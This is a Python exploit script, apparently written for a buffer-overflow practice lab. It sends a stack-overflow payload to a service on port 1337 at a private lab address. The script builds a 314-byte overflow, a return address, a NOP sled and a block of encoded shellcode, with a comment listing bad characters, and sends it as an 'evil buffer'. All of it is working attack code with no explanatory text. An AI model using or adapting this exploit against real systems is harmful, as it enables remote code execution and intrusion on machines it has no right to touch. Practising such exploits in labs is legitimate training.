import socket

ip = "10.10.247.165"
port = 1337

prefix = "OVERFLOW5 "
offset = 314
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
# \x00\x16\x2f\xf4\xfd
payload = (
  "\xfc\xbb\x85\x6b\x92\x8b\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
  "\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x79\x83\x10\x8b\x81"
  "\x54\x75\x05\x64\x65\xb5\x71\xed\xd6\x05\xf1\xa3\xda\xee\x57"
  "\x57\x68\x82\x7f\x58\xd9\x29\xa6\x57\xda\x02\x9a\xf6\x58\x59"
  "\xcf\xd8\x61\x92\x02\x19\xa5\xcf\xef\x4b\x7e\x9b\x42\x7b\x0b"
  "\xd1\x5e\xf0\x47\xf7\xe6\xe5\x10\xf6\xc7\xb8\x2b\xa1\xc7\x3b"
  "\xff\xd9\x41\x23\x1c\xe7\x18\xd8\xd6\x93\x9a\x08\x27\x5b\x30"
  "\x75\x87\xae\x48\xb2\x20\x51\x3f\xca\x52\xec\x38\x09\x28\x2a"
  "\xcc\x89\x8a\xb9\x76\x75\x2a\x6d\xe0\xfe\x20\xda\x66\x58\x25"
  "\xdd\xab\xd3\x51\x56\x4a\x33\xd0\x2c\x69\x97\xb8\xf7\x10\x8e"
  "\x64\x59\x2c\xd0\xc6\x06\x88\x9b\xeb\x53\xa1\xc6\x63\x97\x88"
  "\xf8\x73\xbf\x9b\x8b\x41\x60\x30\x03\xea\xe9\x9e\xd4\x0d\xc0"
  "\x67\x4a\xf0\xeb\x97\x43\x37\xbf\xc7\xfb\x9e\xc0\x83\xfb\x1f"
  "\x15\x03\xab\x8f\xc6\xe4\x1b\x70\xb7\x8c\x71\x7f\xe8\xad\x7a"
  "\x55\x81\x44\x81\x3e\xa4\x9e\xaf\x18\xd0\x9c\xaf\x75\x7d\x28"
  "\x49\x1f\x6d\x7c\xc2\x88\x14\x25\x98\x29\xd8\xf3\xe5\x6a\x52"
  "\xf0\x1a\x24\x93\x7d\x08\xd1\x53\xc8\x72\x74\x6b\xe6\x1a\x1a"
  "\xfe\x6d\xda\x55\xe3\x39\x8d\x32\xd5\x33\x5b\xaf\x4c\xea\x79"
  "\x32\x08\xd5\x39\xe9\xe9\xd8\xc0\x7c\x55\xff\xd2\xb8\x56\xbb"
  "\x86\x14\x01\x15\x70\xd3\xfb\xd7\x2a\x8d\x50\xbe\xba\x48\x9b"
  "\x01\xbc\x54\xf6\xf7\x20\xe4\xaf\x41\x5f\xc9\x27\x46\x18\x37"
  "\xd8\xa9\xf3\xf3\xf8\x4b\xd1\x09\x91\xd5\xb0\xb3\xfc\xe5\x6f"
  "\xf7\xf8\x65\x85\x88\xfe\x76\xec\x8d\xbb\x30\x1d\xfc\xd4\xd4"
  "\x21\x53\xd4\xfc\x21\x53\x2a\xff"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
